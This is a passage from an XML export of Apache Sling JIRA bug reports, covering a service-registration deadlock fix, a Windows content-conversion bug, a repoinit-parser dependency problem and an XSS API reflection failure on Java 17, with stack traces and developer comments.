at org/apache/felix/framework/BundleContextImpl.registerService(BundleContextImpl.java:328) 
at org/apache/felix/scr/impl/manager/AbstractComponentManager$3.register(AbstractComponentManager.java:906) 
at org/apache/felix/scr/impl/manager/AbstractComponentManager$3.register(AbstractComponentManager.java:892) 
at org/apache/felix/scr/impl/manager/RegistrationManager.changeRegistration(RegistrationManager.java:128) 
at org/apache/felix/scr/impl/manager/AbstractComponentManager.registerService(AbstractComponentManager.java:959) 
at org/apache/felix/scr/impl/manager/AbstractComponentManager.activateInternal(AbstractComponentManager.java:732) 
at org/apache/felix/scr/impl/manager/DependencyManager$SingleStaticCustomizer.addedService(DependencyManager.java:1045) 
at org/apache/felix/scr/impl/manager/DependencyManager$SingleStaticCustomizer.addedService(DependencyManager.java:999) 
at org/apache/felix/scr/impl/manager/ServiceTracker$Tracked.customizerAdded(ServiceTracker.java:1216) 
at org/apache/felix/scr/impl/manager/ServiceTracker$Tracked.customizerAdded(ServiceTracker.java:1137) 
at org/apache/felix/scr/impl/manager/ServiceTracker$AbstractTracked.trackAdding(ServiceTracker.java:944) 
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                            <comment id="17618206" author="sagarmiglani" created="Sun, 16 Oct 2022 06:34:45 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=joerghoh&quot; class=&quot;user-hover&quot; rel=&quot;joerghoh&quot;&gt;joerghoh&lt;/a&gt; Can you please have a look and guide?&lt;/p&gt;

&lt;p&gt;Also tried a fix (&lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13050980/13050980_SLING-11620_fix.patch&quot; title=&quot;SLING-11620_fix.patch attached to SLING-11620&quot;&gt;SLING-11620_fix.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt;), changed synchronized methods with a shared lock synchronization block.&lt;/p&gt;</comment>
                            <comment id="17618223" author="cziegeler" created="Sun, 16 Oct 2022 08:23:54 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; I think changing to an explicit lock does not make a difference. I haven&apos;t looked deeply into the problem, but I guess it is based on registering / unregistering services within the synchronized block. So I think all calls for register/unregister needs to move out of that block and the synchronized block should only be used for calculating the state change&lt;/p&gt;</comment>
                            <comment id="17618694" author="sagarmiglani" created="Mon, 17 Oct 2022 07:22:34 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; I think now we have a shared lock object between outer and inner class, so it does makes a difference.&lt;/p&gt;

&lt;p&gt;I believe it is the &lt;tt&gt;synchronized notifyChange&lt;/tt&gt; method of outer class accessing &lt;tt&gt;synchronized getService&lt;/tt&gt; invoked via inner class&apos;s &lt;tt&gt;synchronized retainService/releaseService&lt;/tt&gt; methods from different threads on &lt;tt&gt;serviceChanged&lt;/tt&gt; event of different &lt;tt&gt;ServiceListener&lt;/tt&gt; field objects. (same can be confirmed from the logs I attached in my older comment).&lt;/p&gt;

&lt;p&gt;I could be wrong but I request you to kindly have a look at code. Thanks &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;br/&gt;
Also created this PR for better understanding: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/pull/3&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/pull/3&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17618702" author="cziegeler" created="Mon, 17 Oct 2022 07:45:09 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; Thanks, I missed that you use the same lock in both the outer and the inner class. So, yes, you are right, that should solve the problem&lt;/p&gt;</comment>
                            <comment id="17618729" author="sagarmiglani" created="Mon, 17 Oct 2022 08:51:20 +0000"  >&lt;p&gt;Thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; , I should have created a PR directly to avoid confusion.&lt;br/&gt;
Can we please merge and release with the PR &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;?&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/pull/3&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/pull/3&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17643885" author="henry kuijpers" created="Tue, 6 Dec 2022 14:03:38 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; can this new version of Web Console Security Provider be released, asap? Given the deadlock situation, it is very important to do this very soon &amp;#8211; We have already had downtime due to this issue (in our case AEM didn&apos;t start up and just hung).&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                                                <inwardlinks description="is duplicated by">
                                        <issuelink>
            <issuekey id="13509874">SLING-11717</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                            <attachment id="13050930" name="BlockedThreads.png" size="492366" author="sagarmiglani" created="Fri, 14 Oct 2022 07:13:15 +0000"/>
                            <attachment id="13050980" name="SLING-11620_fix.patch" size="6267" author="sagarmiglani" created="Sun, 16 Oct 2022 06:31:44 +0000"/>
                            <attachment id="13050931" name="WebconsoleServiceListeners.patch" size="4986" author="sagarmiglani" created="Fri, 14 Oct 2022 07:12:08 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>3.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 46 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z19d2g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11615] Handling of initial content might fail on Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11615</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;As has been reported in &lt;a href=&quot;https://github.com/adobe/aemanalyser-maven-plugin/issues/175&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/adobe/aemanalyser-maven-plugin/issues/175&lt;/a&gt; running the cpconverter might fail on windows when sling initial content is encountered.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13485422">SLING-11615</key>
            <summary>Handling of initial content might fail on Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Mon, 10 Oct 2022 12:01:33 +0000</created>
                <updated>Sun, 16 Oct 2022 08:14:22 +0000</updated>
                            <resolved>Mon, 10 Oct 2022 12:03:15 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.1.18</version>
                                    <fixVersion>Content-Package to Feature Model Converter 1.1.20</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17615070" author="cziegeler" created="Mon, 10 Oct 2022 12:03:15 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/f8e82bc5c479adeff88e724f560af0d55efa6000&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/f8e82bc5c479adeff88e724f560af0d55efa6000&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17615074" author="kwin" created="Mon, 10 Oct 2022 12:11:47 +0000"  >&lt;p&gt;It would probably be good to let Jenkins run on Windows nodes for this module (&lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11396&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/SLING-11396&lt;/a&gt;).&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13450221">SLING-11396</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13485468">SLING-11616</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 2 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z197x4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11613] DefaultAclManager depends on private class of repoinit-parser</title>
                <link>https://issues.apache.org/jira/browse/SLING-11613</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Due to this dependency &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/blob/03613ebc1225a62b837ed05bb306a5cd2b3bbd9f/src/main/java/org/apache/sling/feature/cpconverter/accesscontrol/DefaultAclManager.java#L38&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/blob/03613ebc1225a62b837ed05bb306a5cd2b3bbd9f/src/main/java/org/apache/sling/feature/cpconverter/accesscontrol/DefaultAclManager.java#L38&lt;/a&gt; the project is no longer compatible with newer repoinit-parser versions &amp;gt;= 1.7.0.&lt;br/&gt;
The class has been moved in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-repoinit-parser/commit/ed466d08bf7bc313b53f526d5ede5a030ec2678e#diff-27f6c2c20b9b7e83d8c47df7cb7e7ab596e6e66cd869f85f1638b468284f71b7&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-repoinit-parser/commit/ed466d08bf7bc313b53f526d5ede5a030ec2678e#diff-27f6c2c20b9b7e83d8c47df7cb7e7ab596e6e66cd869f85f1638b468284f71b7&lt;/a&gt;.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13485099">SLING-11613</key>
            <summary>DefaultAclManager depends on private class of repoinit-parser</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Fri, 7 Oct 2022 09:36:11 +0000</created>
                <updated>Sun, 16 Oct 2022 08:14:14 +0000</updated>
                            <resolved>Fri, 7 Oct 2022 11:42:53 +0000</resolved>
                                                    <fixVersion>Content-Package to Feature Model Converter 1.1.20</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17613992" author="kwin" created="Fri, 7 Oct 2022 09:43:02 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=angela&quot; class=&quot;user-hover&quot; rel=&quot;angela&quot;&gt;angela&lt;/a&gt; Can you maybe update to repoinit-parser 1.7.0 which moved the necessary class to an exported package?&lt;/p&gt;</comment>
                            <comment id="17614040" author="cziegeler" created="Fri, 7 Oct 2022 11:42:53 +0000"  >&lt;p&gt;Updated in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/22ad2e930dd8ca9bbb620b07ccdef688a42f7c47&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/22ad2e930dd8ca9bbb620b07ccdef688a42f7c47&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13368639">SLING-10268</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 2 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z195y0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11610] Sling XSS API 2.3.0 does not work on Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11610</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Some of the reflection code introduced for the XSS bundle does not work on Java 17. See also &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter/pull/76&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-starter/pull/76&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] Running org.apache.sling.xss.impl.AntiSamyPolicyTest
[ERROR] Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 0.281 s &amp;lt;&amp;lt;&amp;lt; FAILURE! - in org.apache.sling.xss.impl.AntiSamyPolicyTest
[ERROR] org.apache.sling.xss.impl.AntiSamyPolicyTest  Time elapsed: 0.281 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
java.lang.IllegalStateException: java.lang.NoSuchFieldException: modifiers
	at org.apache.sling.xss.impl.AntiSamyPolicyAdapter.removeAttributeGuards(AntiSamyPolicyAdapter.java:274)
	at org.apache.sling.xss.impl.AntiSamyPolicyAdapter.&amp;lt;init&amp;gt;(AntiSamyPolicyAdapter.java:52)
	at org.apache.sling.xss.impl.HtmlSanitizer.&amp;lt;init&amp;gt;(HtmlSanitizer.java:41)
	at org.apache.sling.xss.impl.AntiSamyPolicyTest.setup(AntiSamyPolicyTest.java:49)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:568)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:725)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:149)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptLifecycleMethod(TimeoutExtension.java:126)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptBeforeAllMethod(TimeoutExtension.java:68)
	at org.junit.jupiter.engine.execution.ExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(ExecutableInvoker.java:115)
	at org.junit.jupiter.engine.execution.ExecutableInvoker.lambda$invoke$0(ExecutableInvoker.java:105)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.ExecutableInvoker.invoke(ExecutableInvoker.java:104)
	at org.junit.jupiter.engine.execution.ExecutableInvoker.invoke(ExecutableInvoker.java:98)
	at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$invokeBeforeAllMethods$11(ClassBasedTestDescriptor.java:397)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.invokeBeforeAllMethods(ClassBasedTestDescriptor.java:395)
	at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.before(ClassBasedTestDescriptor.java:209)
	at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.before(ClassBasedTestDescriptor.java:80)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:148)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:107)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:88)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:67)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:52)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:114)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:86)
	at org.junit.platform.launcher.core.DefaultLauncherSession$DelegatingLauncher.execute(DefaultLauncherSession.java:86)
	at org.junit.platform.launcher.core.SessionPerRequestLauncher.execute(SessionPerRequestLauncher.java:53)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:188)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:154)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:128)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:428)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:562)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:548)
Caused by: java.lang.NoSuchFieldException: modifiers
	at java.base/java.lang.Class.getDeclaredField(Class.java:2610)
	at org.apache.sling.xss.impl.AntiSamyPolicyAdapter.letMeIn(AntiSamyPolicyAdapter.java:282)
	at org.apache.sling.xss.impl.AntiSamyPolicyAdapter.removeAttributeGuards(AntiSamyPolicyAdapter.java:271)
	... 63 more
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13484446">SLING-11610</key>
            <summary>Sling XSS API 2.3.0 does not work on Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 4 Oct 2022 13:48:33 +0000</created>
                <updated>Mon, 3 Jul 2023 14:26:10 +0000</updated>
                            <resolved>Fri, 30 Jun 2023 10:47:35 +0000</resolved>
                                    <version>XSS Protection API 2.3.0</version>
